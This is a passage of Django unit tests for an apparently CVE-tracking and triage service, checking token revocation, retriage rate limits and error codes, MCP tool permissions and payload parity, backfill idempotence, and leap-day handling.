		ApiToken.objects.filter(key_hash=hash_token(self.t_alice)).update(revoked=True)
		with mock.patch('cveFeed.hot_validation.manual_eligible') as eligible, \
				mock.patch('cveFeed.validation.run_validation') as checks, \
				mock.patch('cveFeed.triage.run_triage') as ai:
			automatic_validate_finding(queued['id'])
		self.assertEqual(AutomaticValidation.objects.get(pk=queued['id']).status, 'failed')
		eligible.assert_not_called()
		checks.assert_not_called()
		ai.assert_not_called()

	def test_nonmatch_retriage_rejects_closed_finding_and_broker_failure(self):
		from cveFeed.models import AutomaticValidation
		bbot = f'/api/v1/projects/proj-a/findings/vulnerability/{self.bbot.id}/retriage'
		with mock.patch('cveFeed.tasks.automatic_validate_finding.apply_async', side_effect=RuntimeError('broker secret')):
			self.assertEqual(call(self.t_alice, 'POST', bbot)[0], 503)
		self.assertEqual(AutomaticValidation.objects.filter(status='queued').count(), 0)
		self.bbot.open_status = False
		self.bbot.save(update_fields=['open_status'])
		self.assertEqual(call(self.t_alice, 'POST', bbot)[0], 409)

	def test_nonmatch_retriage_is_hourly_bounded(self):
		from cveFeed.models import AutomaticValidation, Triage
		from cveFeed import triage
		row = triage.track([self.bbot])[0][0]
		for _ in range(20):
			AutomaticValidation.objects.create(triage=row, project=self.pa, signature=row.signature,
				priority=3, source='manual', requested_by=self.alice, status='completed')
		bbot = f'/api/v1/projects/proj-a/findings/vulnerability/{self.bbot.id}/retriage'
		with mock.patch('cveFeed.tasks.automatic_validate_finding.apply_async') as dispatch:
			self.assertEqual(call(self.t_alice, 'POST', bbot)[0], 429)
		dispatch.assert_not_called()

	def test_the_mcp_tools_return_the_same_payload(self):
		self.triaged()
		rest = self.get(f'findings/match/{self.match.id}')[1]
		status, body = rpc(self.t_alice, 'tools/call', {'name': 'get_finding', 'arguments': {'project': 'proj-a', 'kind': 'match', 'id': self.match.id}})
		self.assertEqual(status, 200)
		self.assertFalse(body['result']['isError'])
		self.assertEqual(json.loads(body['result']['content'][0]['text']), rest)
		status, body = rpc(self.t_alice, 'tools/call', {'name': 'list_triage', 'arguments': {'project': 'proj-a'}})
		self.assertEqual(json.loads(body['result']['content'][0]['text'])['count'], 6)
		status, body = rpc(self.t_alice, 'tools/call', {'name': 'get_finding', 'arguments': {'project': 'proj-b', 'kind': 'match', 'id': self.match_b.id}})
		self.assertTrue(body['result']['isError'])
		status, body = rpc(self.t_ro, 'tools/call', {'name': 'retriage_finding', 'arguments': {'project': 'proj-a', 'kind': 'match', 'id': self.match.id}})
		self.assertTrue(body['result']['isError'])
		listed = {t['name']: t for t in rpc(self.t_alice, 'tools/list')[1]['result']['tools']}
		self.assertTrue(listed['get_finding']['annotations']['readOnlyHint'])
		self.assertFalse(listed['retriage_finding']['annotations']['readOnlyHint'])

	def test_the_backfill_tracks_findings_with_no_row(self):
		from cveFeed import triage
		from cveFeed.models import Triage
		created = triage.backfill(self.pa.id)
		self.assertEqual(created, 6)
		self.assertEqual(Triage.objects.filter(project=self.pb).count(), 0)
		self.assertEqual(triage.backfill(self.pa.id), 0)


class LeapDayFindingsTests(FindingStatusTests):
	def test_the_findings_list_works_on_29_february(self):
		from datetime import datetime, timezone as tz
		with mock.patch('django.utils.timezone.now', return_value=datetime(2028, 2, 29, 12, tzinfo=tz.utc)):
			status, data = call(self.t_alice, 'GET', '/api/v1/projects/fs-proj/findings')
		self.assertEqual(status, 200, data)
